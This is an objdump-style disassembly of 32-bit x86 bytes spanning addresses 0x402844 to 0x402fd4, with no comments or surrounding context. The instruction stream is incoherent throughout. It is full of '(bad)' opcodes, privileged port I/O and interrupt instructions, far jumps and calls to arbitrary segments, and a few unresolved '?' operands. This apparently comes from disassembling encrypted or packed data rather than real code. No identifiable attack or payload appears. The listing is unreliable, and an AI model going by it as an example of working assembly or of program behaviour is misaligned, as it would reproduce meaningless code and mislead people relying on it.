  402844:	mov    esi,ecx
  402846:	cmp    DWORD PTR [ebp+0x50140405],0x5e6b987b
  402850:	xchg   DWORD PTR [ecx],ebp
  402852:	cdq    
  402853:	fild   DWORD PTR [eax+0x76]
  402856:	mov    edi,0x72913eb4
  40285b:	sbb    esi,ebx
  40285d:	pop    edi
  40285e:	mov    esi,0x21cd5396
  402863:	lahf   
  402864:	or     cl,BYTE PTR [esi+0x4d]
  402867:	push   ebp
  402868:	cli    
  402869:	in     eax,0x60
  40286b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40286c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40286d:	inc    esp
  40286e:	jg     0x40286f
  402870:	or     cl,dh
  402872:	aad    0xe0
  402874:	mov    bh,0xfa
  402876:	fisttp DWORD PTR [edi]
  402878:	or     DWORD PTR gs:[ebx-0x54],ecx
  40287c:	mov    BYTE PTR [edx-0xc4d529a],cl
  402882:	loopne 0x40282e
  402884:	xor    al,0x36
  402886:	mov    al,0xc8
  402888:	pop    edx
  402889:	test   al,0x3b
  40288b:	int    0x39
  40288d:	es jecxz 0x402811
  402890:	and    ch,BYTE PTR [ebx+eiz*4]
  402893:	push   esp
  402894:	cdq    
  402895:	or     DWORD PTR [ebp+0x2ac31413],edx
  40289b:	aam    0x8d
  40289d:	test   edx,0x1fcd8344
  4028a3:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028a5:	icebp  
  4028a6:	inc    ebp
  4028a7:	dec    edx
  4028a8:	iret   
  4028a9:	sub    DWORD PTR fs:[edx-0x48],ebx
  4028ad:	mov    al,ds:0x575a2d4e
  4028b2:	xor    BYTE PTR [esp+ebp*8],dl
  4028b5:	outs   dx,BYTE PTR ds:[esi]
  4028b6:	xchg   esi,eax
  4028b7:	mov    al,0x7
  4028b9:	sbb    DWORD PTR [ebp-0x46],ebp
  4028bc:	jmp    0x9b75:0x4e4e4f70
  4028c3:	mov    edi,0x52254c7f
  4028c8:	mov    ah,0x9c
  4028ca:	pop    edx
  4028cc:	dec    ebx
  4028cd:	loope  0x40292e
  4028cf:	aam    0x98
  4028d1:	retf   0x1e1d
  4028d4:	retf   0x50b9
  4028d7:	add    BYTE PTR [ebx-0x28],ch
  4028da:	and    al,0x6f
  4028dc:	jb     0x4028be
  4028de:	or     ah,cl
  4028e0:	(bad)  
  4028e1:	inc    ebp
  4028e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028e3:	sub    dl,BYTE PTR [ebx+0x5e]
  4028e6:	and    BYTE PTR [ebx-0x70],ah
  4028e9:	jmp    0x706d:0xbff1c75d
  4028f0:	das    
  4028f1:	out    0xee,al
  4028f3:	(bad)  
  4028f4:	stos   BYTE PTR es:[edi],al
  4028f5:	mov    edx,0x926a9044
  4028fa:	or     al,0x8f
  4028fc:	(bad)  
  4028fd:	add    eax,0xd2ae7e1c
  402902:	mov    ecx,0x355d38bf
  402907:	clc    
  402908:	mov    bl,0x9a
  40290a:	dec    eax
  40290b:	mov    bh,BYTE PTR [edi+0x5fd40c42]
  402911:	(bad)
  402914:	mov    esp,0xa87c0da
  402919:	aad    0x6e
  40291b:	or     bh,BYTE PTR [ebx-0x2d]
  40291e:	mov    DWORD PTR [edi-0x3274aea7],eax
  402924:	arpl   WORD PTR [esi+edx*8+0xe],dx
  402928:	aad    0xe1
  40292a:	rcr    DWORD PTR [ebx+eax*4-0x51d26601],0x1b
  402932:	sub    ecx,ebp
  402934:	(bad)  
  402936:	mov    WORD PTR [eax+0x47],cs
  402939:	mov    esp,0x7a9fcf27
  40293e:	in     eax,0xe
  402940:	test   DWORD PTR [esi+0x1ad95a2b],edx
  402946:	mov    ecx,0xf532186b
  40294b:	fisub  DWORD PTR ds:0xe3653e89
  402951:	fwait
  402952:	sahf   
  402953:	xchg   ebp,eax
  402954:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402956:	push   edi
  402957:	pop    fs
  402959:	(bad)  
  40295a:	icebp  
  40295b:	aas    
  40295c:	adc    eax,0xa95db7cd
  402961:	inc    ebp
  402962:	lahf   
  402963:	scas   eax,DWORD PTR es:[edi]
  402964:	hlt    
  402965:	out    0x8f,al
  402967:	and    bh,BYTE PTR [ebp-0xe]
  40296a:	add    ah,dl
  40296c:	das    
  40296d:	or     BYTE PTR [ebx+0xe],ah
  402970:	scas   al,BYTE PTR es:[edi]
  402971:	push   ebx
  402972:	shl    BYTE PTR [eax],1
  402974:	xchg   edi,eax
  402975:	xchg   edi,eax
  402976:	mov    ss,WORD PTR [esi+0x15]
  402979:	fucomip st,st(6)
  40297b:	neg    DWORD PTR [esi-0x30]
  40297e:	add    eax,0xd169c6a2
  402983:	test   DWORD PTR [ebx+0x1a],edi
  402986:	mov    ah,0x69
  402988:	loope  0x40297f
  40298a:	inc    ecx
  40298b:	rcr    BYTE PTR [ebx+esi*2],0x4f
  40298f:	jmp    FWORD PTR [esi-0x47be67c7]
  402995:	pusha  
  402996:	xor    al,0xb9
  402998:	mov    al,0xd0
  40299a:	out    dx,al
  40299b:	jbe    0x402992
  40299d:	pop    ss
  40299e:	outs   dx,DWORD PTR ds:[esi]
  40299f:	stos   DWORD PTR es:[edi],eax
  4029a0:	jne    0x40292a
  4029a2:	retf   0x658b
  4029a5:	(bad)  
  4029a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029a7:	or     BYTE PTR [eax+0x38548e5b],cl
  4029ad:	mov    dh,0x3f
  4029af:	xchg   esp,eax
  4029b0:	fld    QWORD PTR [edx+0x6b8c4bcc]
  4029b6:	call   0x7a591bdc
  4029bb:	test   al,0x6f
  4029bd:	popa   
  4029be:	mov    al,ah
  4029c0:	outs   dx,DWORD PTR ds:[esi]
  4029c1:	push   edi
  4029c2:	dec    ecx
  4029c3:	or     bl,al
  4029c5:	arpl   WORD PTR [ecx+0x62],si
  4029c8:	fs add eax,0x55341a12
  4029ce:	sub    al,0x10
  4029d0:	sub    DWORD PTR [edi-0x69],ebx
  4029d3:	mov    ecx,0x91f275d0
  4029d8:	lock inc esp
  4029da:	inc    edx
  4029db:	shl    BYTE PTR [eax+0x6874d90a],0x45
  4029e2:	mov    edi,?
  4029e4:	pop    esp
  4029e5:	mov    DWORD PTR [edx+ebp*8-0x64],esp
  4029e9:	xchg   edi,eax
  4029ea:	inc    esp
  4029eb:	sub    ebx,edi
  4029ed:	lds    ebp,FWORD PTR [edx]
  4029ef:	fdivr  DWORD PTR [ebx-0x76]
  4029f2:	add    cl,BYTE PTR es:[esi+esi*1+0x7399b94b]
  4029fa:	out    dx,eax
  4029fb:	mov    ah,0xe1
  4029fd:	xchg   ebx,eax
  4029fe:	xor    eax,0x417a5e43
  402a03:	sub    al,0x68
  402a05:	pop    esi
  402a06:	aam    0xc5
  402a08:	fadd   st(4),st
  402a0a:	mov    ah,0x90
  402a0c:	(bad)  
  402a0d:	retf   
  402a0e:	int    0xf4
  402a10:	in     eax,dx
  402a11:	(bad)  
  402a12:	loopne 0x402a33
  402a14:	xor    BYTE PTR [eax],bl
  402a16:	repz adc BYTE PTR [ebx],dh
  402a19:	ds fwait
  402a1b:	sbb    esi,DWORD PTR [edi+0x34]
  402a1e:	push   esp
  402a1f:	fucom  st(4)
  402a21:	mov    esi,0xd37625b5
  402a26:	scas   eax,DWORD PTR es:[edi]
  402a27:	js     0x402a50
  402a29:	or     al,0x24
  402a2b:	fwait
  402a2c:	leave  
  402a2d:	push   ebx
  402a2e:	stc    
  402a2f:	sub    edi,0x9d255d51
  402a35:	xchg   esi,eax
  402a36:	dec    edi
  402a37:	mov    WORD PTR [esi],gs
  402a39:	or     al,0xad
  402a3b:	loop   0x402aa6
  402a3d:	int3   
  402a3e:	loopne 0x4029e4
  402a40:	lea    ebx,[edx-0x4e4477a0]
  402a46:	xchg   esp,eax
  402a47:	scas   al,BYTE PTR es:[edi]
  402a48:	ss jl  0x4029f4
  402a4b:	xor    bl,BYTE PTR ss:[eax+0x60]
  402a4f:	push   esp
  402a50:	loop   0x402a20
  402a52:	out    0xcb,eax
  402a54:	cdq    
  402a55:	out    0x29,al
  402a57:	lods   al,BYTE PTR ds:[esi]
  402a58:	mov    eax,0x48e072bc
  402a5d:	dec    ebx
  402a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a5f:	fs inc esi
  402a61:	add    BYTE PTR [ebp+0x3d],bh
  402a64:	add    al,BYTE PTR [edx]
  402a66:	addr16 out 0x57,al
  402a69:	xchg   BYTE PTR [ebp-0x569c71b3],ah
  402a6f:	and    BYTE PTR [esi-0x76],al
  402a72:	mov    eax,0x2000e96c
  402a77:	fwait
  402a78:	aam    0x89
  402a7a:	fisub  DWORD PTR [edi-0x7014df91]
  402a80:	pop    edi
  402a81:	fwait
  402a82:	sub    al,0x1f
  402a84:	loope  0x402a81
  402a86:	mov    bh,BYTE PTR [esp+eax*4-0x209e44a3]
  402a8d:	pop    ss
  402a8e:	mov    al,ds:0x68bc3f2a
  402a93:	gs dec edi
  402a96:	push   cs
  402a97:	mov    cs,esi
  402a99:	push   0x78
  402a9b:	mov    ecx,0x4c577dd0
  402aa0:	jno    0x402ac2
  402aa2:	and    eax,0xf185caff
  402aa7:	data16 or al,bl
  402aaa:	loop   0x402b29
  402aac:	mov    BYTE PTR [esi-0x49],bh
  402aaf:	add    cl,BYTE PTR [eax+0x5a]
  402ab2:	add    dh,BYTE PTR [ecx-0x56d3d7a0]
  402ab8:	scas   eax,DWORD PTR es:[edi]
  402ab9:	dec    edi
  402aba:	out    dx,al
  402abb:	rcr    esi,0x5
  402abe:	cmp    al,0x50
  402ac0:	call   0xcf498b89
  402ac5:	test   al,0xf1
  402ac7:	leave  
  402ac8:	shl    esp,0x23
  402acb:	xchg   esi,eax
  402acc:	test   eax,0x191e31c1
  402ad1:	and    eax,0x5c8450b4
  402ad6:	xlat   BYTE PTR ds:[ebx]
  402ad7:	and    esp,esi
  402ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ada:	mov    bh,0x29
  402adc:	lds    eax,FWORD PTR [edx*2+0x4a19729d]
  402ae3:	sbb    BYTE PTR [esi+0x50],ch
  402ae6:	adc    DWORD PTR [ebx+0x3d],edi
  402ae9:	inc    eax
  402aea:	cdq    
  402aeb:	and    ch,BYTE PTR [esi+0x18a60a1d]
  402af1:	push   edx
  402af2:	jmp    0x754e9f57
  402af7:	(bad)  
  402af8:	fisttp DWORD PTR ds:0xde1a8df
  402afe:	xor    DWORD PTR [ebx+0x71c862de],esi
  402b04:	inc    edx
  402b05:	sub    edi,DWORD PTR [edi]
  402b07:	outs   dx,BYTE PTR ds:[esi]
  402b08:	aad    0xc3
  402b0a:	adc    eax,edx
  402b0c:	and    al,0x5c
  402b0e:	add    bh,BYTE PTR [ebx]
  402b10:	dec    eax
  402b11:	mov    ebp,0xdf26675d
  402b16:	dec    edi
  402b17:	dec    esp
  402b18:	out    0xd4,al
  402b1a:	imul   esp,ebp,0x7c
  402b1d:	mov    bh,0x9d
  402b1f:	pop    ds
  402b20:	pusha  
  402b21:	leave  
  402b22:	jbe    0x402af6
  402b24:	mov    ds:0xe1805b7,eax
  402b29:	lods   eax,DWORD PTR ds:[esi]
  402b2a:	cmc    
  402b2b:	push   ebp
  402b2c:	dec    esp
  402b2d:	imul   esi,DWORD PTR [esi-0x79],0x3abb1575
  402b34:	adc    cl,ah
  402b36:	sbb    edx,DWORD PTR [edx]
  402b38:	mov    ah,0x7
  402b3a:	cdq    
  402b3b:	ficom  WORD PTR [edi]
  402b3d:	adc    DWORD PTR [ebx-0x6a],esp
  402b40:	mov    eax,0x705a0fb1
  402b45:	lea    edi,[edx+0x71]
  402b48:	loope  0x402b46
  402b4a:	ins    BYTE PTR es:[edi],dx
  402b4b:	jecxz  0x402afb
  402b4d:	in     al,dx
  402b4e:	imul   ebx,DWORD PTR [ebp+0x37],0x30
  402b52:	cmp    ah,bh
  402b54:	dec    eax
  402b55:	fstp   QWORD PTR ds:[esi+ecx*8+0x13]
  402b5a:	loope  0x402b61
  402b5c:	cmp    BYTE PTR [esi],cl
  402b5e:	push   0xfffffffe
  402b60:	ficomp WORD PTR [esi+0x5abe45e]
  402b66:	addr16 lahf 
  402b68:	sub    eax,0xc324f69
  402b6d:	neg    BYTE PTR [ecx]
  402b6f:	inc    esp
  402b70:	dec    eax
  402b71:	mov    esi,0xa21a087
  402b76:	dec    ebp
  402b77:	sbb    DWORD PTR [edi+0x378dd2e0],ebx
  402b7d:	jp     0x402baf
  402b7f:	or     al,0x18
  402b81:	pop    ss
  402b82:	out    dx,eax
  402b83:	ret    
  402b84:	push   ss
  402b85:	xor    eax,0xd196ecfd
  402b8a:	xor    eax,0x44f27c26
  402b8f:	ror    BYTE PTR [edx],0x92
  402b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b93:	stos   DWORD PTR es:[edi],eax
  402b94:	in     eax,dx
  402b95:	dec    esi
  402b96:	jmp    0x402be8
  402b98:	cdq    
  402b99:	mov    al,ds:0xfcff75e9
  402b9e:	sbb    bl,cl
  402ba0:	fsub   QWORD PTR [ecx]
  402ba2:	pop    ss
  402ba3:	mov    al,ds:0xb0b28820
  402ba8:	add    dh,BYTE PTR [ecx+0xfecad63]
  402bae:	adc    dh,dh
  402bb0:	jo     0x402bc4
  402bb2:	rep ins BYTE PTR es:[edi],dx
  402bb4:	(bad)
  402bb7:	js     0x402b76
  402bb9:	xchg   ecx,eax
  402bba:	xchg   ebx,eax
  402bbb:	dec    ebx
  402bbc:	jae    0x402bf5
  402bbe:	call   0x8400:0x915dd9f9
  402bc5:	pop    es
  402bc6:	sbb    dh,bh
  402bc8:	xchg   DWORD PTR [eax],ebp
  402bca:	add    al,0xc7
  402bcc:	out    0x50,eax
  402bce:	sub    bh,bl
  402bd0:	mov    WORD PTR [edi+0x18],?
  402bd3:	inc    esp
  402bd4:	out    dx,al
  402bd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bd6:	repnz retf 
  402bd8:	mov    eax,0xc01c5f8b
  402bdd:	inc    edx
  402bde:	push   0x1a
  402be0:	xchg   ebp,eax
  402be1:	or     al,0x1e
  402be3:	inc    edi
  402be4:	mov    al,0xf9
  402be6:	dec    DWORD PTR [eax-0x24]
  402be9:	(bad)  
  402bea:	jmp    0x558949f3
  402bef:	neg    DWORD PTR [ecx+0x2983543]
  402bf5:	cmc    
  402bf6:	sub    BYTE PTR [ecx+0x3f53a899],dl
  402bfc:	sub    ecx,edi
  402bfe:	rol    BYTE PTR [eax+0xe],cl
  402c01:	adc    eax,0xc1d5c44
  402c06:	cs aaa 
  402c08:	jecxz  0x402bc8
  402c0a:	mov    bl,0xc
  402c0c:	test   BYTE PTR [ecx+0x12cfdc8c],al
  402c12:	and    DWORD PTR ds:0x81cbc52,ebp
  402c18:	jl     0x402c5b
  402c1a:	dec    edi
  402c1b:	or     al,0xd9
  402c1d:	imul   eax,DWORD PTR [ebx],0x11
  402c20:	out    dx,eax
  402c21:	jne    0x402c7d
  402c23:	xchg   edi,eax
  402c24:	cmp    DWORD PTR [edx+eiz*2],ecx
  402c27:	dec    edi
  402c28:	inc    eax
  402c29:	push   edx
  402c2a:	add    bh,bl
  402c2c:	ret    0x8736
  402c2f:	or     cl,cl
  402c31:	push   ss
  402c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c33:	cld    
  402c34:	adc    DWORD PTR fs:[ecx],ecx
  402c37:	das    
  402c38:	ins    BYTE PTR es:[edi],dx
  402c39:	xlat   BYTE PTR ds:[ebx]
  402c3a:	pop    es
  402c3b:	ins    DWORD PTR es:[edi],dx
  402c3c:	std    
  402c3d:	and    DWORD PTR ds:0x25b015fd,ebp
  402c43:	hlt    
  402c44:	push   edx
  402c45:	inc    ecx
  402c46:	fxch   st(4)
  402c48:	das    
  402c49:	sbb    eax,0x694e14cd
  402c4e:	jle    0x402c6c
  402c50:	pop    esi
  402c51:	add    bl,BYTE PTR [esi]
  402c53:	mov    dl,0xce
  402c55:	push   ds
  402c56:	mov    BYTE PTR [eax],dl
  402c58:	daa    
  402c59:	cmp    DWORD PTR [edi+edx*2-0xfae147c],0x21
  402c61:	mov    eax,ds:0x54cce6cb
  402c66:	dec    ebp
  402c67:	jp     0x402c00
  402c69:	and    DWORD PTR [esi+0x79],eax
  402c6c:	rcr    DWORD PTR [ebp-0x7d25da62],0xf3
  402c73:	aad    0x81
  402c75:	adc    eax,0x11e23c9b
  402c7a:	sbb    ebx,eax
  402c7c:	test   BYTE PTR [ebp-0x75],dh
  402c7f:	push   eax
  402c80:	push   ecx
  402c81:	mov    bh,0xb4
  402c83:	sbb    bl,BYTE PTR [edx+0x23]
  402c86:	repnz sti 
  402c88:	pop    ebx
  402c89:	inc    ebx
  402c8a:	xchg   WORD PTR [edi],bp
  402c8d:	shl    BYTE PTR [edi],1
  402c8f:	ror    DWORD PTR [ebx-0x21],1
  402c92:	mov    al,ds:0x40ea3d74
  402c97:	cld    
  402c98:	mov    esp,0xa82b7567
  402c9d:	lds    ebp,FWORD PTR [esp+ecx*1+0x2de5194e]
  402ca4:	xchg   DWORD PTR [ebp+0xe],ebp
  402ca7:	loopne 0x402cb3
  402ca9:	mov    bl,BYTE PTR [esi+0x26fd738e]
  402caf:	adc    ch,dl
  402cb1:	sub    DWORD PTR [ecx-0x3],eax
  402cb4:	sar    BYTE PTR [eax-0x1a],cl
  402cb7:	ret    0xe05d
  402cba:	(bad)  [edi+edi*8]
  402cbd:	int    0x9d
  402cbf:	mov    ebx,0x35ce042d
  402cc4:	or     BYTE PTR [edi+0x244c390c],0x72
  402ccb:	aam    0x6d
  402ccd:	dec    esi
  402cce:	and    esp,0xffffffdc
  402cd1:	sbb    BYTE PTR [ebx+0x20f7c465],0x7a
  402cd8:	ror    esp,0xd2
  402cdb:	mov    al,0x3f
  402cdd:	mov    edi,0x8de4f2d9
  402ce2:	(bad)  
  402ce3:	je     0x402d5d
  402ce5:	xchg   edx,eax
  402ce6:	and    al,0xd
  402ce8:	in     eax,dx
  402ce9:	sbb    eax,0x3a3da292
  402cee:	sub    DWORD PTR [ecx],esi
  402cf0:	ss cli 
  402cf2:	xchg   ebp,eax
  402cf3:	sti    
  402cf4:	rcr    BYTE PTR [edx+ebx*8-0x4b],1
  402cf8:	sbb    eax,DWORD PTR [edi]
  402cfa:	ins    DWORD PTR es:[edi],dx
  402cfb:	imul   ebp,DWORD PTR [edx+edi*4+0x3a9085fe],0x58ac6317
  402d06:	jecxz  0x402cee
  402d08:	xor    ebp,0x5910b175
  402d0e:	or     DWORD PTR [eax-0x33],ecx
  402d11:	je     0x402d18
  402d13:	mov    edx,0x2162e141
  402d18:	out    dx,al
  402d19:	daa    
  402d1a:	and    ebp,DWORD PTR ds:0x975528c1
  402d20:	popa   
  402d21:	adc    ah,dh
  402d23:	pop    ebp
  402d24:	imul   ebp,ebp,0x523610af
  402d2a:	mov    edi,0x61dfc9e9
  402d2f:	ins    BYTE PTR es:[edi],dx
  402d30:	jo     0x402d94
  402d32:	push   ecx
  402d33:	fild   WORD PTR [esi]
  402d35:	aad    0x13
  402d37:	mov    al,0x45
  402d39:	sub    DWORD PTR [edx-0x5a],esi
  402d3c:	xchg   ebp,eax
  402d3d:	addr16 pop esi
  402d3f:	mov    ah,0x71
  402d41:	jmp    0xc3648484
  402d46:	popf   
  402d47:	jo     0x402d17
  402d49:	in     eax,dx
  402d4a:	lods   eax,DWORD PTR ds:[esi]
  402d4b:	bound  edx,QWORD PTR [ecx]
  402d4d:	jne    0x402d1c
  402d4f:	pop    ds
  402d50:	sbb    BYTE PTR [eax+0x45906313],cl
  402d56:	cld    
  402d57:	loopne 0x402d79
  402d59:	lods   al,BYTE PTR ds:[esi]
  402d5a:	mov    ds:0xe4372b2d,eax
  402d5f:	or     al,0xa0
  402d61:	cmp    ecx,ebx
  402d63:	ja     0x402d07
  402d65:	loop   0x402d5f
  402d67:	mov    ds:0x4fbcf8b5,al
  402d6c:	jae    0x402dcd
  402d6e:	in     al,0x9d
  402d70:	adc    dl,BYTE PTR [edi+0x6bc9967b]
  402d76:	add    DWORD PTR ds:0xfb1beee6,ecx
  402d7c:	or     esp,ebx
  402d7e:	jecxz  0x402ddf
  402d80:	iret   
  402d81:	push   es
  402d82:	pop    edx
  402d83:	shl    DWORD PTR [eax+0x6b76ea20],cl
  402d89:	mov    esi,0xe42293a5
  402d8e:	das    
  402d8f:	jnp    0x402db5
  402d91:	add    DWORD PTR [eax-0x45],esp
  402d94:	sbb    eax,DWORD PTR [ebx+eax*1-0x48]
  402d98:	push   ecx
  402d99:	rcl    ebp,1
  402d9b:	call   0x7457:0x57c009fb
  402da2:	dec    eax
  402da3:	retf   0xb994
  402da6:	sbb    al,BYTE PTR [eax]
  402da8:	mov    dl,ah
  402daa:	inc    eax
  402dab:	adc    ch,BYTE PTR [ebx+0x2aa1c5ab]
  402db1:	mov    bl,0x87
  402db3:	outs   dx,DWORD PTR ds:[esi]
  402db4:	lock mov bl,0xb3
  402db7:	aas    
  402db8:	jl     0x402e2e
  402dba:	and    ah,BYTE PTR [ecx-0x63]
  402dbd:	in     al,0xc3
  402dbf:	inc    ebp
  402dc0:	cld    
  402dc1:	cmp    dl,bl
  402dc3:	data16 cmp BYTE PTR [edi+eax*1-0x59],bl
  402dc8:	push   ds
  402dc9:	in     eax,dx
  402dca:	ins    BYTE PTR es:[edi],dx
  402dcb:	push   esp
  402dcc:	and    dl,BYTE PTR [edi-0x270edcb9]
  402dd2:	mov    dh,0xd8
  402dd4:	push   cs
  402dd5:	daa    
  402dd6:	xchg   ebp,eax
  402dd7:	jno    0x402d60
  402dd9:	into   
  402dda:	stc    
  402ddb:	and    al,BYTE PTR [ebp-0x5e]
  402dde:	mov    ebx,0x4ebd6293
  402de3:	nop
  402de4:	pop    esp
  402de5:	inc    ecx
  402de6:	add    al,BYTE PTR [edx+edi*2]
  402de9:	es je  0x402e0b
  402dec:	xchg   edx,eax
  402ded:	out    dx,al
  402dee:	(bad)  
  402def:	sbb    BYTE PTR [ecx+0x79],ah
  402df2:	inc    esp
  402df3:	cmp    BYTE PTR [eax+0x78],cl
  402df6:	mov    ebp,0x976f121
  402dfb:	jp     0x402e76
  402dfd:	scas   al,BYTE PTR es:[edi]
  402dfe:	mov    bl,0x38
  402e00:	dec    ebx
  402e01:	mov    ebp,0x14b07aa6
  402e06:	jle    0x402e70
  402e08:	sub    edx,eax
  402e0a:	pusha  
  402e0b:	rcr    BYTE PTR [ecx],cl
  402e0d:	add    al,0xa8
  402e0f:	(bad)  
  402e10:	cmp    al,0xb3
  402e12:	sahf   
  402e13:	in     al,dx
  402e14:	mov    BYTE PTR [eax],bl
  402e16:	std    
  402e17:	cs push ebp
  402e19:	inc    ecx
  402e1a:	pop    ebp
  402e1b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e1d:	test   DWORD PTR [eax+0x68ccb67a],edx
  402e23:	pop    edi
  402e24:	or     al,0x2e
  402e26:	mov    esi,0x1e7accd3
  402e2b:	pushf  
  402e2c:	dec    ebx
  402e2d:	xchg   edi,eax
  402e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e2f:	push   ebx
  402e30:	addr16 daa 
  402e32:	pusha  
  402e33:	xchg   esp,eax
  402e34:	clc    
  402e35:	ret    
  402e36:	ret    
  402e37:	push   0x15c6279e
  402e3c:	fist   WORD PTR [esi+ebx*1+0x59722d8b]
  402e44:	sbb    eax,0xab79c803
  402e49:	out    0x51,al
  402e4b:	fdivp  st(2),st
  402e4d:	inc    esi
  402e4e:	mov    dh,0xcc
  402e50:	pop    esp
  402e51:	mov    ?,ebp
  402e53:	fucomip st,st(3)
  402e55:	sar    BYTE PTR cs:[eax-0x9],1
  402e59:	ja     0x402e6d
  402e5b:	pop    eax
  402e5c:	in     al,0xd4
  402e5e:	ja     0x402e58
  402e60:	xor    edi,DWORD PTR [edi-0x34c34332]
  402e66:	jl     0x402e42
  402e68:	push   0x8ddcbfd6
  402e6d:	sbb    al,0xef
  402e6f:	dec    ebx
  402e70:	call   0x76e7:0x32ccc600
  402e77:	cmp    BYTE PTR [ebx],bh
  402e79:	cld    
  402e7a:	xchg   esp,eax
  402e7b:	cld    
  402e7c:	fwait
  402e7d:	cmp    ecx,DWORD PTR [eax]
  402e7f:	shl    esp,cl
  402e81:	jmp    0x402e52
  402e83:	adc    al,0x90
  402e85:	cwde   
  402e86:	(bad)  
  402e87:	push   ebx
  402e88:	dec    ebx
  402e89:	dec    eax
  402e8a:	dec    edx
  402e8b:	mov    ecx,ebp
  402e8d:	adc    esi,DWORD PTR [eax]
  402e8f:	add    eax,0x97e855d2
  402e94:	xor    BYTE PTR [eax+0x40],cl
  402e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e98:	cmp    ah,ah
  402e9a:	fimul  DWORD PTR [ebp+edx*2-0x13]
  402e9e:	test   eax,0x5c0b1a9a
  402ea3:	xor    BYTE PTR [ebp-0x4bb8f2b6],cl
  402ea9:	or     eax,0xc17019d8
  402eae:	sub    esi,edi
  402eb0:	mov    ?,WORD PTR [ebp+0x6]
  402eb3:	mov    ds:0x4c9a49e9,eax
  402eb8:	cwde   
  402eb9:	rcl    BYTE PTR [ecx-0xc84fde3],0x61
  402ec0:	xchg   ebx,eax
  402ec1:	mov    eax,ds:0x1030b312
  402ec6:	adc    DWORD PTR [esi+esi*2-0x6cad2882],eax
  402ecd:	fwait
  402ece:	pop    es
  402ecf:	aas    
  402ed0:	push   ecx
  402ed1:	out    dx,al
  402ed2:	mov    bl,0xa2
  402ed4:	xchg   edx,eax
  402ed5:	enter  0x97ed,0x64
  402ed9:	mov    ecx,0xccf7f830
  402ede:	pop    ecx
  402edf:	push   ss
  402ee0:	repz add al,BYTE PTR [ebx-0x6b6140e2]
  402ee7:	mov    eax,ds:0x9b022a44
  402eec:	loop   0x402ec3
  402eee:	dec    ebp
  402eef:	dec    eax
  402ef0:	dec    ecx
  402ef1:	cmp    al,0x1b
  402ef3:	retf   0x9878
  402ef6:	jmp    0xc010:0x12919002
  402efd:	and    edi,DWORD PTR [eax]
  402eff:	pop    ss
  402f00:	test   eax,0x4794db4
  402f05:	hlt    
  402f06:	(bad)  
  402f07:	cs inc edx
  402f09:	dec    ebx
  402f0a:	retf   
  402f0b:	lds    ecx,FWORD PTR [esi]
  402f0d:	es mov al,ah
  402f10:	inc    ebp
  402f11:	fldcw  WORD PTR [edx+0x34]
  402f14:	mov    al,0x9c
  402f16:	xchg   BYTE PTR [esi],bl
  402f18:	retf   0x644b
  402f1b:	cdq    
  402f1c:	ror    DWORD PTR [edi-0x6d],cl
  402f1f:	repz sahf 
  402f21:	lea    esi,[eax+0x3]
  402f24:	rcr    BYTE PTR [edx-0x20],cl
  402f27:	adc    ebp,DWORD PTR [eax-0x11]
  402f2a:	into   
  402f2b:	inc    esp
  402f2c:	cmp    DWORD PTR [ecx+ecx*4+0x43],0xa2b61059
  402f34:	mov    ds:0x4e19fcea,eax
  402f39:	(bad)  
  402f3a:	in     eax,0x2e
  402f3c:	and    al,0xa1
  402f3e:	sahf   
  402f3f:	aad    0x4a
  402f41:	sbb    BYTE PTR ds:0x937b3592,dl
  402f47:	in     eax,0x39
  402f49:	jmp    0x402f4d
  402f4b:	cmp    ecx,esp
  402f4d:	dec    ecx
  402f4e:	dec    eax
  402f4f:	ja     0x402f8d
  402f51:	push   cs
  402f52:	pop    esp
  402f53:	xchg   esp,eax
  402f54:	test   eax,0x429c39cc
  402f59:	mov    ecx,0xf16775aa
  402f5e:	sti    
  402f5f:	mov    BYTE PTR [edx],bh
  402f61:	mov    ch,0x5e
  402f63:	jle    0x402f03
  402f65:	loope  0x402f6c
  402f67:	test   eax,0xf0fdbf55
  402f6c:	sahf   
  402f6d:	stos   DWORD PTR es:[edi],eax
  402f6e:	push   cs
  402f6f:	mov    dh,0x42
  402f71:	mov    ebp,DWORD PTR [esi+0x1497e1c4]
  402f77:	js     0x402f34
  402f79:	fbld   TBYTE PTR [ebp+0x2da0e599]
  402f7f:	imul   eax,edx,0x352df11f
  402f85:	pop    ecx
  402f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f87:	add    edx,DWORD PTR [eax+0x5]
  402f8a:	pop    ss
  402f8b:	and    DWORD PTR [ecx-0x2f],0xd57fcf09
  402f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f93:	jbe    0x402f68
  402f95:	std    
  402f96:	xor    bh,BYTE PTR [edi-0x5aed2f45]
  402f9c:	xor    ebp,0xffffff9a
  402f9f:	sahf   
  402fa0:	dec    edi
  402fa1:	stos   DWORD PTR es:[edi],eax
  402fa2:	pop    ss
  402fa3:	leave  
  402fa4:	stos   BYTE PTR es:[edi],al
  402fa5:	in     al,0x1d
  402fa7:	stos   BYTE PTR es:[edi],al
  402fa8:	jb     0x402fa1
  402faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fab:	dec    ecx
  402fac:	mov    BYTE PTR [edi],dl
  402fae:	ins    BYTE PTR es:[edi],dx
  402faf:	and    BYTE PTR [ecx+ecx*2+0x32],cl
  402fb3:	(bad)  
  402fb4:	jns    0x403009
  402fb6:	jl     0x40300d
  402fb8:	out    dx,al
  402fb9:	jo     0x402f4d
  402fbb:	mov    esi,0x2fc8c084
  402fc0:	cwde   
  402fc1:	call   0x30d1:0x8f61c224
  402fc8:	inc    edx
  402fc9:	ret    
  402fca:	adc    eax,edi
  402fcc:	and    eax,0xdfdb4f6
  402fd1:	je     0x403042
  402fd3:	(bad)  
  402fd4:	mov    eax,0xd0eae2d8
